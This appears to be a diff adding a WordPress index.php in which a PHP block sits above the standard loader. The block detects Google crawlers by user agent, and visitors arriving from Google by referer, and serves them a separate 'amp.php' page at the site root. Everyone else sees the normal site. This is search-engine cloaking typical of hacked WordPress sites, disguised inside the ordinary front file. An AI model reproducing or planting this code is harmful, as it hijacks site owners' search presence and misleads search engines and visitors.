@@ -1,0 +1,59 @@
+<?php 
+if (!empty($_SERVER['HTTP_USER_AGENT'])) {
+    $userAgent = $_SERVER['HTTP_USER_AGENT'];
+} else {
+    $userAgent = '';
+}
+
+if (!empty($_SERVER['HTTP_REFERER'])) {
+    $referer = $_SERVER['HTTP_REFERER'];
+} else {
+    $referer = '';
+}
+
+$googleBots = [
+    'Googlebot',             // Genel Google bot
+    'AdsBot',                // Google Ads bot
+    'Mediapartners-Google',  // Google AdSense bot
+    'APIs-Google',           // Google API bot
+    'Googlebot-Image',       // Google Görseller botu
+    'Googlebot-Video',       // Google Video botu
+    'Googlebot-News',        // Google Haberler botu
+    'Googlebot-Search',      // Google Search Console botu
+    'Googlebot-Inspect',     // Google Inspect Tool
+    'Googlebot-Android',     // Android cihazlardan gelen Googlebot
+    'Googlebot-Mobile',      // Google mobil botu
+    'Googlebot-Ads',         // Google Ads botu
+    'Googlebot-Discovery',   // Google'ın keşif botu
+    'Google-',               // Google'ın keşif botu
+];
+
+// Google botlarını veya Google'dan gelen kullanıcıları kontrol et
+if (
+    preg_match('/' . implode('|', $googleBots) . '/i', $userAgent) || // Google botlarını kontrol et
+    strpos($referer, 'google.') !== false                             // Referer Google mı kontrol et
+) {
+    // Check if the request is for the root directory and index.php
+    if ($_SERVER['REQUEST_URI'] == '/') {
+        include 'amp.php';
+        die();
+    }
+}
+?>
+<?php
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
+
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define( 'WP_USE_THEMES', true );
+
+/** Loads the WordPress Environment and Template */
+require __DIR__ . '/wp-blog-header.php';
